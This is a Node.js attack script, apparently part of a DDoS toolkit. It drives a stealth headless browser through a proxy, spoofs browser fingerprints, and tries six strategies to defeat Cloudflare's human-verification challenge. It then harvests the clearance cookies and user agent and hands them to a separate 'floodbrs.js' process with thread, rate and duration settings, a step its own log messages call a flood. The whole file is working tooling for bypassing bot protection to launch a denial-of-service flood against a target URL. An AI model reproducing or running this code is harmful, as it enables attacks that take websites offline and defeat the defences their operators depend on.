const fs = require('fs');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const { spawn, exec } = require('child_process');

puppeteer.use(StealthPlugin());

const COLORS = {
    RED: '\x1b[31m',
    GREEN: '\x1b[32m',
    YELLOW: '\x1b[33m',
    BLUE: '\x1b[34m',
    RESET: '\x1b[0m'
};

// Ultimate stealth configuration
const applyUltimateStealth = async (page) => {
    await page.evaluateOnNewDocument(() => {
        // Remove automation detection
        Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
        
        // Spoof plugins
        Object.defineProperty(navigator, 'plugins', {
            get: () => [
                {
                    name: 'Chrome PDF Plugin',
                    filename: 'internal-pdf-viewer',
                    description: 'Portable Document Format'
                },
                {
                    name: 'Chrome PDF Viewer',
                    filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai', 
                    description: 'Portable Document Format'
                }
            ]
        });

        // Spoof languages
        Object.defineProperty(navigator, 'languages', {
            get: () => ['en-US', 'en', 'id-ID', 'id']
        });

        // Mock Chrome runtime
        window.chrome = {
            runtime: {
                connect: () => ({
                    onMessage: { addListener: () => {} },
                    postMessage: () => {},
                    onDisconnect: { addListener: () => {} }
                }),
                sendMessage: () => {},
                onMessage: { addListener: () => {} },
                onConnect: { addListener: () => {} },
                getManifest: () => ({}),
                id: 'testid'
            },
            loadTimes: () => ({
                firstPaintTime: 0,
                requestTime: 0,
                startLoadTime: 0,
                commitLoadTime: 0,
                finishDocumentLoadTime: 0,
                finishLoadTime: 0,
                navigationType: 'Reload',
                wasFetchedViaSpdy: true,
                wasNpnNegotiated: true,
                npnNegotiatedProtocol: 'h2',
                connectionInfo: 'h2'
            }),
            csi: () => ({
                onloadT: Date.now(),
                startE: Date.now() - 1000,
                pageT: 1200,
                tran: 15
            }),
            app: {
                isInstalled: false,
                InstallState: {
                    DISABLED: 'disabled',
                    INSTALLED: 'installed',
                    NOT_INSTALLED: 'not_installed'
                },
                RunningState: {
                    CANNOT_RUN: 'cannot_run',
                    READY_TO_RUN: 'ready_to_run',
                    RUNNING: 'running'
                }
            }
        };

        // Hardware spoofing
        Object.defineProperty(navigator, 'hardwareConcurrency', { value: 8 });
        Object.defineProperty(navigator, 'deviceMemory', { value: 8 });
        Object.defineProperty(navigator, 'maxTouchPoints', { value: 0 });

        // Document properties
        Object.defineProperty(document, 'hidden', { value: false });
        Object.defineProperty(document, 'visibilityState', { value: 'visible' });

        // Remove all automation traces
        const automationProps = [
            '__webdriver_evaluate',
            '__selenium_evaluate',
            '__webdriver_script_function',
            '__webdriver_script_func',
            '__webdriver_script_fn',
            '_Selenium_IDE_Recorder',
            '_selenium',
            'callPhantom',
            'callSelenium',
            'phantom',
            'webdriver',
            'selenium',
            '_phantom'
        ];
        automationProps.forEach(prop => delete window[prop]);
    });
};

const getUltimateArgs = () => [
    '--no-sandbox',
    '--disable-setuid-sandbox',
    '--disable-dev-shm-usage',
    '--disable-accelerated-2d-canvas',
    '--disable-gpu',
    '--disable-blink-features=AutomationControlled',
    '--disable-infobars',
    '--ignore-certificate-errors',
    '--ignore-ssl-errors',
    '--disable-web-security',
    '--disable-features=site-per-process,TranslateUI',
    '--disable-ipc-flooding-protection',
    '--disable-backgrounding-occluded-windows',
    '--disable-renderer-backgrounding',
    '--disable-background-timer-throttling',
    '--disable-background-networking',
    '--disable-client-side-phishing-detection',
    '--disable-default-apps',
    '--disable-extensions',
    '--disable-component-extensions-with-background-pages',
    '--disable-translate',
    '--no-default-browser-check',
    '--no-first-run',
    '--window-size=1920,1080',
    '--user-data-dir=/tmp/puppeteer'
];

// ULTIMATE CLOUDFLARE SOLVER
const solveCloudflareUltimate = async (page, proxy, targetURL) => {
    log('SOLVER', `Starting ultimate solver for ${maskProxy(proxy)}`, 'BLUE');
    
    let title = await page.title().catch(() => '');
    let currentUrl = page.url();
    
    log('DEBUG', `Initial - Title: "${title}", URL: ${currentUrl}`, 'YELLOW');

    // Check if already passed
    if (!title.includes('Just a moment') && 
        !title.includes('Checking your browser') &&
        !currentUrl.includes('challenges.cloudflare.com')) {
        log('SUCCESS', 'Already bypassed!', 'GREEN');
        return { solved: true, method: 'already_passed' };
    }

    log('INFO', 'Cloudflare challenge detected', 'YELLOW');

    // STRATEGY 1: Wait for auto-verification
    log('STRATEGY 1', 'Waiting for auto-verification (12 seconds)', 'BLUE');
    await sleep(12);

    title = await page.title().catch(() => '');
    if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
        log('SUCCESS', 'Auto-verification successful!', 'GREEN');
        return { solved: true, method: 'auto_verification' };
    }

    // STRATEGY 2: Frame interaction with multiple approaches
    log('STRATEGY 2', 'Frame interaction with multiple approaches', 'BLUE');
    
    const frames = await page.frames();
    let challengeSolved = false;

    for (const frame of frames) {
        try {
            const frameUrl = frame.url();
            if (frameUrl.includes('challenges.cloudflare.com') || frameUrl.includes('/cdn-cgi/')) {
                log('DEBUG', `Found challenge frame: ${frameUrl}`, 'YELLOW');

                // Wait for challenge to load
                await sleep(5);

                // Approach 2A: Find by challenge text and nearby checkbox
                const challengeTexts = [
                    'Verify you are human',
                    'Buktikan bahwa Anda adalah manusia',
                    'Prove you are human', 
                    'Confirm you are human',
                    'Verify you are human by completing',
                    'I am human'
                ];

                for (const text of challengeTexts) {
                    try {
                        const xpath = `//*[contains(text(), '${text}') or contains(., '${text}')]`;
                        const textElements = await frame.$x(xpath);
                        
                        if (textElements.length > 0) {
                            log('SUCCESS', `Found challenge text: "${text}"`, 'GREEN');
                            
                            for (const textElement of textElements) {
                                // Get text element position
                                const textBox = await textElement.boundingBox();
                                if (textBox) {
                                    log('DEBUG', `Text position: x=${textBox.x}, y=${textBox.y}`, 'YELLOW');
                                    
                                    // Click slightly left of the text (where checkbox usually is)
                                    const checkboxX = textBox.x - 50;
                                    const checkboxY = textBox.y + textBox.height / 2;
                                    
                                    await page.mouse.click(checkboxX, checkboxY);
                                    log('SUCCESS', `Clicked at checkbox position: ${checkboxX}, ${checkboxY}`, 'GREEN');
                                    challengeSolved = true;
                                    
                                    await sleep(15);
                                    
                                    title = await page.title().catch(() => '');
                                    if (!title.includes('Just a moment')) {
                                        log('SUCCESS', 'Text-based click solved!', 'GREEN');
                                        return { solved: true, method: 'text_based_click' };
                                    }
                                    break;
                                }
                            }
                        }
                    } catch (error) {
                        // Continue to next text
                    }
                }

                // Approach 2B: Direct element interaction
                if (!challengeSolved) {
                    const interactiveSelectors = [
                        'input[type="checkbox"]',
                        '.cf-challenge-checkbox',
                        '[role="checkbox"]',
                        '#cf-challenge-checkbox',
                        '.hcaptcha-checkbox',
                        '.recaptcha-checkbox',
                        'button',
                        'input[type="submit"]',
                        '.btn',
                        '.button',
                        '[role="button"]'
                    ];

                    for (const selector of interactiveSelectors) {
                        try {
                            const elements = await frame.$$(selector);
                            for (const element of elements) {
                                try {
                                    const isVisible = await element.isIntersectingViewport();
                                    if (isVisible) {
                                        await element.click({ delay: 100 });
                                        log('SUCCESS', `Clicked element: ${selector}`, 'GREEN');
                                        challengeSolved = true;
                                        
                                        await sleep(15);
                                        
                                        title = await page.title().catch(() => '');
                                        if (!title.includes('Just a moment')) {
                                            log('SUCCESS', 'Element click solved!', 'GREEN');
                                            return { solved: true, method: 'element_click' };
                                        }
                                        break;
                                    }
                                } catch (error) {
                                    // Continue to next element
                                }
                            }
                            if (challengeSolved) break;
                        } catch (error) {
                            // Continue to next selector
                        }
                    }
                }

                break;
            }
        } catch (error) {
            // Continue to next frame
        }
    }

    // STRATEGY 3: Smart coordinate clicking
    if (!challengeSolved) {
        log('STRATEGY 3', 'Smart coordinate clicking', 'BLUE');
        
        const viewport = page.viewport();
        const centerX = viewport.width / 2;
        const centerY = viewport.height / 2;
        
        // Common Cloudflare checkbox positions
        const smartPositions = [
            // Left side positions (most common)
            { x: centerX - 200, y: centerY, desc: 'Far left' },
            { x: centerX - 150, y: centerY, desc: 'Left' },
            { x: centerX - 100, y: centerY, desc: 'Near left' },
            
            // Center positions
            { x: centerX, y: centerY, desc: 'Center' },
            { x: centerX, y: centerY - 50, desc: 'Center up' },
            { x: centerX, y: centerY + 50, desc: 'Center down' },
            
            // Right positions
            { x: centerX + 100, y: centerY, desc: 'Near right' },
            { x: centerX + 150, y: centerY, desc: 'Right' }
        ];

        for (const position of smartPositions) {
            try {
                await page.mouse.click(position.x, position.y);
                log('CLICK', `Clicked at ${position.x}, ${position.y} (${position.desc})`, 'YELLOW');
                
                await sleep(8);
                
                title = await page.title().catch(() => '');
                if (!title.includes('Just a moment')) {
                    log('SUCCESS', `Coordinate click solved at ${position.desc}!`, 'GREEN');
                    return { solved: true, method: 'coordinate_click' };
                }
            } catch (error) {
                // Continue to next position
            }
        }
    }

    // STRATEGY 4: JavaScript execution in page context
    if (!challengeSolved) {
        log('STRATEGY 4', 'JavaScript execution', 'BLUE');
        
        try {
            await page.evaluate(() => {
                // Try to find and click any checkbox
                const checkboxes = document.querySelectorAll('input[type="checkbox"]');
                checkboxes.forEach(checkbox => {
                    try {
                        if (checkbox.offsetWidth > 0 && checkbox.offsetHeight > 0) {
                            checkbox.click();
                        }
                    } catch (e) {}
                });
                
                // Try to submit any form
                const forms = document.querySelectorAll('form');
                forms.forEach(form => {
                    try {
                        form.submit();
                    } catch (e) {}
                });
                
                // Trigger click events
                document.dispatchEvent(new MouseEvent('click', { bubbles: true }));
            });
            
            await sleep(15);
            
            title = await page.title().catch(() => '');
            if (!title.includes('Just a moment')) {
                log('SUCCESS', 'JavaScript execution solved!', 'GREEN');
                return { solved: true, method: 'javascript_execution' };
            }
        } catch (error) {
            log('ERROR', `JavaScript execution failed: ${error.message}`, 'RED');
        }
    }

    // STRATEGY 5: Refresh and retry
    if (!challengeSolved) {
        log('STRATEGY 5', 'Refresh and retry', 'BLUE');
        
        await page.reload({ waitUntil: 'networkidle0', timeout: 30000 }).catch(() => {});
        await sleep(20);
        
        title = await page.title().catch(() => '');
        if (!title.includes('Just a moment')) {
            log('SUCCESS', 'Refresh solved!', 'GREEN');
            return { solved: true, method: 'refresh' };
        }
    }

    // STRATEGY 6: Final direct navigation
    if (!challengeSolved) {
        log('STRATEGY 6', 'Direct navigation with headers', 'BLUE');
        
        await page.setExtraHTTPHeaders({
            'Referer': 'https://www.google.com/',
            'Accept-Language': 'en-US,en;q=0.9,id;q=0.8'
        });
        
        await page.goto(targetURL, { 
            waitUntil: 'networkidle0', 
            timeout: 45000 
        }).catch(() => {});
        
        await sleep(20);
        title = await page.title().catch(() => '');
        
        if (!title.includes('Just a moment')) {
            log('SUCCESS', 'Direct navigation solved!', 'GREEN');
            return { solved: true, method: 'direct_navigation' };
        }
    }

    log('ERROR', 'All ultimate strategies failed', 'RED');
    return { solved: false, method: 'all_failed' };
};

// Extract cookies
const extractCookies = async (page, targetURL) => {
    await sleep(5);
    
    const allCookies = await page.cookies().catch(() => []);
    
    if (allCookies.length === 0) {
        log('COOKIES', 'No cookies found', 'YELLOW');
        return { cookies: '', count: 0, names: [] };
    }

    // Filter Cloudflare cookies
    const cloudflareCookies = allCookies.filter(cookie => 
        cookie.name.includes('cf_') ||
        cookie.name.includes('__cf') ||
        cookie.domain.includes('cloudflare')
    );

    log('COOKIES', `Total cookies: ${allCookies.length}`, 'GREEN');
    
    if (cloudflareCookies.length > 0) {
        const cloudflareNames = cloudflareCookies.map(c => c.name).join(', ');
        log('COOKIES', `Cloudflare cookies: ${cloudflareNames}`, 'BLUE');
        
        const cookieString = cloudflareCookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
        return {
            cookies: cookieString,
            count: cloudflareCookies.length,
            names: cloudflareCookies.map(c => c.name)
        };
    } else {
        log('COOKIES', 'No Cloudflare cookies, using all cookies', 'YELLOW');
        const cookieString = allCookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
        const allNames = allCookies.map(c => c.name).join(', ');
        log('COOKIES', `All cookies: ${allNames}`, 'YELLOW');
        
        return {
            cookies: cookieString,
            count: allCookies.length,
            names: allCookies.map(c => c.name)
        };
    }
};

// Command-line setup
if (process.argv.length < 6) {
    console.log('Usage: node browser.js <targetURL> <threads> <proxyFile> <rate> <time>');
    console.log('Example: node browser.js https://example.com 2 proxies.txt 10 120');
    process.exit(1);
}

const targetURL = process.argv[2];
const threads = parseInt(process.argv[3]);
const proxyFile = process.argv[4];
const rate = process.argv[5];
const duration = parseInt(process.argv[6]);

let successCount = 0;

// Utility functions
const generateRandomString = (length) => {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
};

const validKey = generateRandomString(16);

const readProxies = (filePath) => {
    try {
        const proxies = fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
        return [proxies[0]];
    } catch (error) {
        log('ERROR', 'Cannot read proxy file', 'RED');
        return [];
    }
};

const maskProxy = (proxy) => {
    const parts = proxy.split(':');
    if (parts.length >= 2) {
        const ip = parts[0];
        if (ip.split('.').length === 4) {
            return `${ip.split('.')[0]}.${ip.split('.')[1]}.**.**:****`;
        }
    }
    return proxy;
};

const log = (type, message, color = 'RESET') => {
    const colorCode = COLORS[color] || COLORS.RESET;
    console.log(`${colorCode}[${type}] ${message}${COLORS.RESET}`);
};

const sleep = (seconds) => new Promise(resolve => setTimeout(resolve, seconds * 1000));

const randomElement = (array) => array[Math.floor(Math.random() * array.length)];

// User agents
const userAgents = [
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0`
];

// Ultimate browser launcher
const launchUltimateBrowser = async (targetURL, proxy, attempt = 1) => {
    const userAgent = randomElement(userAgents);
    let browser;

    const options = {
        headless: true,
        args: [
            `--user-agent=${userAgent}`,
            ...getUltimateArgs()
        ],
        defaultViewport: { 
            width: 1920, 
            height: 1080 
        },
        ignoreHTTPSErrors: true
    };

    try {
        log('LAUNCH', `Attempt ${attempt} for ${maskProxy(proxy)}`, 'BLUE');
        
        browser = await puppeteer.launch(options);
        const [page] = await browser.pages();

        // Apply ultimate stealth
        await applyUltimateStealth(page);

        // Set realistic headers
        await page.setExtraHTTPHeaders({
            'Accept-Language': 'en-US,en;q=0.9,id;q=0.8',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none'
        });

        log('NAVIGATE', `Going to: ${targetURL}`, 'BLUE');
        
        // Navigate to target
        await page.goto(targetURL, { 
            waitUntil: 'networkidle0', 
            timeout: 60000 
        }).catch(() => {});

        // Solve Cloudflare with ultimate solver
        const solveResult = await solveCloudflareUltimate(page, proxy, targetURL);
        
        if (!solveResult.solved) {
            throw new Error(`Cloudflare challenge failed: ${solveResult.method}`);
        }

        // Extract cookies
        const cookieResult = await extractCookies(page, targetURL);
        
        successCount++;
        log('SUCCESS', `Solved via ${solveResult.method}! Cookies: ${cookieResult.count}`, 'GREEN');

        await browser.close();

        return {
            cookies: cookieResult.cookies,
            userAgent: userAgent,
            cookieCount: cookieResult.count,
            cookieNames: cookieResult.names,
            method: solveResult.method
        };

    } catch (error) {
        if (browser) await browser.close().catch(() => {});
        
        if (attempt < 3) {
            const retryDelay = 10 + attempt * 5;
            log('RETRY', `Retrying in ${retryDelay}s (${attempt}/3)...`, 'YELLOW');
            await sleep(retryDelay);
            return launchUltimateBrowser(targetURL, proxy, attempt + 1);
        }
        
        log('FAILED', `${maskProxy(proxy)} - ${error.message}`, 'RED');
        return null;
    }
};

// Main execution
const main = async () => {
    const proxies = readProxies(proxyFile);
    
    if (proxies.length === 0) {
        log('ERROR', 'No proxies found', 'RED');
        process.exit(1);
    }

    log('START', `Target: ${targetURL}`, 'GREEN');
    log('INFO', `Using 1 proxy | Flood threads: ${threads} | Time: ${duration}s | Rate: ${rate}`, 'BLUE');

    // Process the proxy
    const proxy = proxies[0];
    
    try {
        const result = await launchUltimateBrowser(targetURL, proxy);
        
        if (result && result.cookies) {
            log('RESULT', `Proxy ${maskProxy(proxy)} - ${result.cookieCount} cookies - Method: ${result.method}`, 'GREEN');
            
            // Launch flood process
            try {
                log('FLOOD', `Starting flood with ${threads} threads, rate ${rate} for ${duration}s`, 'GREEN');
                const floodProcess = spawn('node', [
                    'floodbrs.js',
                    targetURL,
                    duration.toString(),
                    rate,
                    threads.toString(),
                    proxyFile,
                    result.cookies,
                    result.userAgent,
                    validKey
                ], {
                    detached: false,
                    stdio: 'inherit'
                });
                
                floodProcess.on('close', (code) => {
                    log('FLOOD', `Flood process completed`, 'YELLOW');
                    process.exit(0);
                });
                
            } catch (error) {
                log('ERROR', `Failed to start flood: ${error.message}`, 'RED');
            }
        } else {
            log('ERROR', 'No cookies obtained', 'RED');
        }
    } catch (error) {
        log('ERROR', error.message, 'RED');
    }
};

// Error handling
process.on('uncaughtException', (error) => {
    log('CRASH', error.message, 'RED');
});

process.on('unhandledRejection', (error) => {
    log('REJECTION', error.message, 'RED');
});

process.on('SIGINT', () => {
    log('INFO', 'Shutdown signal received', 'YELLOW');
    process.exit(0);
});

log('READY', 'ULTIMATE CLOUDFLARE BYPASS - 6 STRATEGIES COMBINED', 'GREEN');
main().catch(error => {
    log('ERROR', error.message, 'RED');
    process.exit(1);
});
